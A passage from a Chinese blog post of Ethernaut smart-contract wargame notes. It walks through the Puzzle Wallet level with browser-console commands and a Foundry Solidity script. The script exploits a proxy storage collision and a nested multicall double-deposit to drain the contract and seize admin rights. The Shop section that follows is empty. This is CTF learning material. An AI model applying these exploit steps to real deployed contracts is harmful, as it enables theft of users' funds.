function_">toWei</span>(<span class="string">&quot;0.001&quot;</span>)&#125;)</span><br><span class="line">web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">&quot;0.002&quot;</span>)===<span class="keyword">await</span> contract.<span class="title function_">balances</span>(player).<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> v.<span class="title function_">toString</span>())</span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>然后再提取出来就能绕过了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">await contract.execute(player,toWei(&quot;0.002&quot;),0x0)</span><br><span class="line">await getBalance(instance)</span><br><span class="line">//0</span><br></pre></td></tr></table></figure>

<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240328164509228.png" alt="image-20240328164509228"></p>
<p>最后修改maxBalance达到修改admin的目的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">await web3.eth.getStorageAt(instance,0)</span><br><span class="line">//&#x27;0x000000000000000000000000e92f4fd673fcb0f578ac2df10145396170e05ad7&#x27;</span><br><span class="line">await web3.eth.getStorageAt(instance,1)</span><br><span class="line">//&#x27;0x000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824&#x27;</span><br><span class="line">addr = &quot;0x000000000000000000000000&quot;+player.slice(2,)</span><br><span class="line">//&#x27;0x000000000000000000000000E92F4FD673fCB0f578aC2dF10145396170E05aD7&#x27;</span><br><span class="line">addr.length</span><br><span class="line">//66</span><br><span class="line">await contract.setMaxBalance(addr)</span><br><span class="line">await web3.eth.getStorageAt(instance,0)</span><br><span class="line">//&#x27;0x000000000000000000000000e92f4fd673fcb0f578ac2df10145396170e05ad7&#x27;</span><br><span class="line">await web3.eth.getStorageAt(instance,1)</span><br><span class="line">//&#x27;0x000000000000000000000000e92f4fd673fcb0f578ac2df10145396170e05ad7&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240328165648063.png" alt="image-20240328165648063"></p>
<h5 id="攻击流程-23"><a href="#攻击流程-23" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>获取一个实例,之后查看instance的地址<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240327093000671.png" alt="image-20240327093000671"></p>
<p>之后执行上面的那些代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">selector = web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;proposeNewAdmin(address)&quot;</span>).<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">10</span>)</span><br><span class="line"><span class="comment">//&#x27;0xa6376746&#x27;</span></span><br><span class="line">param = <span class="string">&quot;00000000000000&quot;</span>+player.<span class="title function_">slice</span>(<span class="number">2</span>,)</span><br><span class="line"><span class="comment">//&#x27;00000000000000E92F4FD673fCB0f578aC2dF10145396170E05aD7&#x27;</span></span><br><span class="line">param = <span class="string">&quot;000000000000000000000000&quot;</span>+player.<span class="title function_">slice</span>(<span class="number">2</span>,)</span><br><span class="line"><span class="comment">//&#x27;000000000000000000000000E92F4FD673fCB0f578aC2dF10145396170E05aD7&#x27;</span></span><br><span class="line">param.<span class="property">length</span></span><br><span class="line"><span class="comment">//64</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">data</span>:selector+param&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="comment">//&#x27;0xE92F4FD673fCB0f578aC2dF10145396170E05aD7&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改owner</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)</span><br><span class="line"><span class="comment">//&#x27;0.001&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="property">multicall</span>.<span class="title function_">request</span>([web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;deposit()&quot;</span>).<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">10</span>)])</span><br><span class="line"><span class="comment">/*&#123;from: &#x27;0xE92F4FD673fCB0f578aC2dF10145396170E05aD7&#x27;, gasPrice: 13644492, gas: 2000000, to: &#x27;0xAf92FD0290d95F319ef24e4341493d3D22B86e27&#x27;, data: &#x27;0xac9650d80000000000000000000000000000000000000000…0000000000000000000000000000000000000000000000000&#x27;&#125;</span></span><br><span class="line"><span class="comment">data: &quot;0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line"><span class="comment">from: &quot;0xE92F4FD673fCB0f578aC2dF10145396170E05aD7&quot;</span></span><br><span class="line"><span class="comment">gas: 2000000gas</span></span><br><span class="line"><span class="comment">Price: 13644492</span></span><br><span class="line"><span class="comment">to: &quot;0xAf92FD0290d95F319ef24e4341493d3D22B86e27&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">data = <span class="string">&quot;0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">selector = web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;deposit()&quot;</span>).<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">10</span>)</span><br><span class="line"><span class="comment">//&#x27;0xd0e30db0&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">multicall</span>([data,selector],&#123;<span class="attr">value</span>:web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">&quot;0.001&quot;</span>)&#125;)</span><br><span class="line">web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">&quot;0.002&quot;</span>)===<span class="keyword">await</span> contract.<span class="title function_">balances</span>(player).<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> v.<span class="title function_">toString</span>())</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//利用multicall调用两次deposit，增加balance的值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">execute</span>(player,<span class="title function_">toWei</span>(<span class="string">&quot;0.002&quot;</span>),<span class="number">0x0</span>)</span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(instance)</span><br><span class="line"><span class="comment">//0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//提取值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">0</span>)</span><br><span class="line"><span class="comment">//&#x27;0x000000000000000000000000e92f4fd673fcb0f578ac2df10145396170e05ad7&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">1</span>)</span><br><span class="line"><span class="comment">//&#x27;0x000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824&#x27;</span></span><br><span class="line">addr = <span class="string">&quot;0x000000000000000000000000&quot;</span>+player.<span class="title function_">slice</span>(<span class="number">2</span>,)</span><br><span class="line"><span class="comment">//&#x27;0x000000000000000000000000E92F4FD673fCB0f578aC2dF10145396170E05aD7&#x27;</span></span><br><span class="line">addr.<span class="property">length</span></span><br><span class="line"><span class="comment">//66</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setMaxBalance</span>(addr)</span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">0</span>)</span><br><span class="line"><span class="comment">//&#x27;0x000000000000000000000000e92f4fd673fcb0f578ac2df10145396170e05ad7&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">1</span>)</span><br><span class="line"><span class="comment">//&#x27;0x000000000000000000000000e92f4fd673fcb0f578ac2df10145396170e05ad7&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改admin的值</span></span><br></pre></td></tr></table></figure>

<p>或者通过合约去执行,效果和上面那些是一样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &quot;../instances/Ilevel24.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract POC is Script &#123;</span><br><span class="line"></span><br><span class="line">    PuzzleWallet wallet = PuzzleWallet(0x7E069Cb68CE876D435b422652f86462F4A276145);</span><br><span class="line">    PuzzleProxy px = PuzzleProxy(0x7E069Cb68CE876D435b422652f86462F4A276145);</span><br><span class="line"></span><br><span class="line">    function run() external&#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line"></span><br><span class="line">        //creating encoded function data to pass into multicall</span><br><span class="line">        bytes[] memory depositSelector = new bytes[](1);</span><br><span class="line">        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);</span><br><span class="line">        bytes[] memory nestedMulticall = new bytes[](2);</span><br><span class="line">        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);</span><br><span class="line">        nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);</span><br><span class="line"></span><br><span class="line">        // making ourselves owner of wallet</span><br><span class="line">        px.proposeNewAdmin(msg.sender);</span><br><span class="line">        //whitelisting our address</span><br><span class="line">        wallet.addToWhitelist(msg.sender);</span><br><span class="line">        //calling multicall with nested data stored above</span><br><span class="line">        wallet.multicall&#123;value: 0.001 ether&#125;(nestedMulticall);</span><br><span class="line">        //calling execute to drain the contract</span><br><span class="line">        wallet.execute(msg.sender, 0.002 ether, &quot;&quot;);</span><br><span class="line">        //calling setMaxBalance with our address to become the admin of proxy</span><br><span class="line">        wallet.setMaxBalance(uint256(msg.sender));</span><br><span class="line">        //making sure our exploit worked</span><br><span class="line">        console.log(&quot;New Admin is : &quot;, px.admin());</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后提交示例即可</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240328170338751.png" alt="image-20240328170338751"></p>
<h3 id="Shop-1"><a href="#Shop-1" class="headerlink" title="Shop"></a>Shop</h3><h5 id="闯关要求-17"><a href="#闯关要求-17" class="headerlink" title="闯关要求"></a>闯关要求</h5><h5 id="合约代码-25"><a href="#合约代码-25" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="合约分析-25"><a href="#合约分析-25" class="headerlink" title="合约分析"></a>合约分析</h5><h5 id="攻击流程-24"><a href="#攻击流程-24" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>获取一个实例,之后查看instance的地址</p>
<p>之后部署攻击合约</p>
<p>之后点击”Hack”实施攻击即可：</p>
<p>最后提交示例即可</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://blog.dixitaditya.com/ethernaut-level-21-shop?source=more_series_bottom_blogs">https://blog.dixitaditya.com/ethernaut-level-21-shop?source=more_series_bottom_blogs</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7174?time__1311=n4+xnD0GDtKxyDRxWqGNWPbtGOD9ijDYuu4vD&alichlgref=https://xz.aliyun.com/t/7174#reply-19734">https://xz.aliyun.com/t/7174?time__1311=n4%2BxnD0GDtKxyDRxWqGNWPbtGOD9ijDYuu4vD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7174#reply-19734</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41578716/article/details/103825476">https://blog.csdn.net/qq_41578716/article/details/103825476</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://c0ke.top">C0KE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://c0ke.top/2025/07/15/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/">http://c0ke.top/2025/07/15/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://c0ke.top" target="_blank">Daily Study</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/07/15/fastbin%20attack%E6%8A%A5%E9%94%99%E5%86%85%E5%AD%98%E6%8D%9F%E5%9D%8F/" title="fastbin attack报错内存损坏"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">fastbin attack报错内存损坏</div></div></a></div><div class="next-post pull-right"><a href="/2025/07/15/ESP32%20IoT%20CTF%20%E6%B8%85%E5%8D%8E%E6%A0%A1%E8%B5%9B%E7%89%88/" title="ESP32 IoT CTF 清华校赛版"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ESP32 IoT CTF 清华校赛版</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">C0KE</div><div class="author-info__description">C0KE's Study Diary</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">404</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">60</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/C0KE"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/C0KE" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/weixin_62675330?spm=1000.2115.3001.5343" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:2269279877@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">人人都有选择如何活着的权力</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">ethernaut训练笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.2.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.3.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E5%85%B3%E6%96%A9%E5%B0%86"><span class="toc-number">1.4.</span> <span class="toc-text">过关斩将</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hello-Ethernaut"><span class="toc-number">1.4.1.</span> <span class="toc-text">Hello Ethernaut</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fallback"><span class="toc-number">1.4.2.</span> <span class="toc-text">Fallback</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AF%E5%85%B3%E8%A6%81%E6%B1%82"><span class="toc-number">1.4.2.0.1.</span> <span class="toc-text">闯关要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81"><span class="toc-number">1.4.2.0.2.</span> <span class="toc-text">合约代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E5%88%86%E6%9E%90"><span class="toc-number">1.4.2.0.3.</span> <span class="toc-text">合约分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">1.4.2.0.4.</span> <span class="toc-text">攻击流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fallout"><span class="toc-number">1.4.3.</span> <span class="toc-text">Fallout</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AF%E5%85%B3%E8%A6%81%E6%B1%82-1"><span class="toc-number">1.4.3.0.1.</span> <span class="toc-text">闯关要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81-1"><span class="toc-number">1.4.3.0.2.</span> <span class="toc-text">合约代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E5%88%86%E6%9E%90-1"><span class="toc-number">1.4.3.0.3.</span> <span class="toc-text">合约分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-1"><span class="toc-number">1.4.3.0.4.</span> <span class="toc-text">攻击流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Coin-Flip"><span class="toc-number">1.4.4.</span> <span class="toc-text">Coin Flip</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AF%E5%85%B3%E8%A6%81%E6%B1%82-2"><span class="toc-number">1.4.4.0.1.</span> <span class="toc-text">闯关要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81-2"><span class="toc-number">1.4.4.0.2.</span> <span class="toc-text">合约代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E5%88%86%E6%9E%90-2"><span class="toc-number">1.4.4.0.3.</span> <span class="toc-text">合约分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-2"><span class="toc-number">1.4.4.0.4.</span> <span class="toc-text">攻击流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Telephone"><span class="toc-number">1.4.5.</span> <span class="toc-text">Telephone</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AF%E5%85%B3%E8%A6%81%E6%B1%82-3"><span class="toc-number">1.4.5.0.1.</span> <span class="toc-text">闯关要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81-3"><span class="toc-number">1.4.5.0.2.</span> <span class="toc-text">合约代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E5%88%86%E6%9E%90-3"><span class="toc-number">1.4.5.0.3.</span> <span class="toc-text">合约分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-3"><span class="toc-number">1.4.5.0.4.</span> <span class="toc-text">攻击流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token"><span class="toc-number">1.4.6.</span> <span class="toc-text">Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AF%E5%85%B3%E8%A6%81%E6%B1%82-4"><span class="toc-number">1.4.6.0.1.</span> <span class="toc-text">闯关要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81-4"><span class="toc-number">1.4.6.0.2.</span> <span class="toc-text">合约代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E5%88%86%E6%9E%90-4"><span class="toc-number">1.4.6.0.3.</span> <span class="toc-text">合约分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-4"><span class="toc-number">1.4.6.0.4.</span> <span class="toc-text">攻击流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Delegation"><span class="toc-number">1.4.7.</span> <span class="toc-text">Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AF%E5%85%B3%E8%A6%81%E6%B1%82-5"><span class="toc-number">1.4.7.0.1.</span> <span class="toc-text">闯关要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81-5"><span class="toc-number">1.4.7.0.2.</span> <span class="toc-text">合约代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E5%88%86%E6%9E%90-5"><span class="toc-number">1.4.7.0.3.</span> <span class="toc-text">合约分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-5"><span class="toc-number">1.4.7.0.4.</span> <span class="toc-text">攻击流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Force"><span class="toc-number">1.4.8.</span> <span class="toc-text">Force</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AF%E5%85%B3%E8%A6%81%E6%B1%82-6"><span class="toc-number">1.4.8.0.1.</span> <span class="toc-text">闯关要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81-6"><span class="toc-number">1.4.8.0.2.</span> <span class="toc-text">合约代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E5%88%86%E6%9E%90-6"><span class="toc-number">1.4.8.0.3.</span> <span class="toc-text">合约分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-6"><span class="toc-number">1.4.8.0.4.</span> <span class="toc-text">攻击流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vault"><span class="toc-number">1.4.9.</span> <span class="toc-text">Vault</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AF%E5%85%B3%E8%A6%81%E6%B1%82-7"><span class="toc-number">1.4.9.0.1.</span> <span class="toc-text">闯关要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81-7"><span class="toc-number">1.4.9.0.2.</span> <span class="toc-text">合约代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E5%88%86%E6%9E%90-7"><span class="toc-number">1.4.9.0.3.</span> <span class="toc-text">合约分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-7"><span class="toc-number">1.4.9.0.4.</span> <span class="toc-text">攻击流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#King"><span class="toc-number">1.4.10.</span> <span class="toc-text">King</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AF%E5%85%B3%E8%A6%81%E6%B1%82-8"><span class="toc-number">1.4.10.0.1.</span> <span class="toc-text">闯关要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81-8"><span class="toc-number">1.4.10.0.2.</span> <span class="toc-text">合约代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E5%88%86%E6%9E%90-8"><span class="toc-number">1.4.10.0.3.</span> <span class="toc-text">合约分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-8"><span class="toc-number">1.4.10.0.4.</span> <span class="toc-text">攻击流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Re-entrancy"><span class="toc-number">1.4.11.</span> <span class="toc-text">Re-entrancy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AF%E5%85%B3%E8%A6%81%E6%B1%82-9"><span class="toc-number">1.4.11.0.1.</span> <span class="toc-text">闯关要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 